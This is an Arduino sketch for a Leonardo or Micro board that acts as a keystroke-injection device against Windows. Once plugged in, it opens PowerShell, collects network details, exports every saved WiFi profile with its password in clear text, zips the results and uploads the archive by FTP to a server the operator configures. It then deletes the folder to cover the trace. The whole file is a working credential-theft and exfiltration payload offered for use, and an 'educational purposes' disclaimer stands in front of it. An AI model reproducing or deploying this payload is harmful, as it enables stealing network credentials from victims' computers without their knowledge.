/*
  Windows FTP Steal WiFi Credentials

  This payload for Windows creates a tmp folder in the user's 
  directory, exports WiFi profiles with clear passwords, 
  along with some useful info, then opens an FTP connection to
  upload all the data and deletes the folder at the end.

  created 27 july 2024
  by C.E. alias c0rgo

  WARNING: this script requires Arduino Leonardo or Micro.
  Be sure to have the required board or you will get an error.

  DISCLAIMER: this code is for educational purposes only.
  Do not attempt to violate the law, any misuse of this script
  can result in criminal charges.
  I will not be responsible for any of your illegal actions.
  You may however try it out on your computer at your own risk.
*/

// #define HID_CUSTOM_LAYOUT
// #define LAYOUT_HERE
#include <HID-Project.h>

// Device initialization
void setup() {
  Keyboard.begin();
  // Mandatory delay before launching payload
  delay(3000);
}

void loop() {
  // Press Windows key
  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  // Press R key
  Keyboard.press('r');
  // Release the keys together
  // WIN + R = Execute dialog
  Keyboard.releaseAll();
  delay(1000);

  // Launch PowerShell
  // .println also presses ENTER after the string
  Keyboard.println("powershell.exe");
  delay(5000);

  Keyboard.println("cd $Env:userprofile");
  delay(2000);
  Keyboard.println("mkdir tmp");
  delay(2000);
  Keyboard.println("ipconfig /all > ./tmp/ip_info.txt");
  delay(2000);
  Keyboard.println("netsh wlan export profile folder=.\\tmp key=clear");
  delay(4500);
  Keyboard.println("Compress-Archive -Path ./tmp -DestinationPath ./tmp/tmp_archive.zip");
  delay(6500);
  Keyboard.println("ftp -i");
  delay(2000);
  // Put here your FTP server ADDRESS
  Keyboard.println("open 192.168.1.1");
  delay(2000);
  // Put here your FTP server USER
  Keyboard.println("ftpuser");
  delay(2000);
  // Put here your FTP server PASSWORD
  Keyboard.println("ftppass");
  delay(2000);
  Keyboard.println("put ./tmp/tmp_archive.zip");
  delay(6500);
  Keyboard.println("bye");
  delay(2000);
  Keyboard.println("del -r tmp");
  delay(3000);
  Keyboard.println("exit");
  delay(500);

  //End Keyboard Control
  Keyboard.end();

  // End of payload
  // Prevent loop relaunch
  while (1);
}
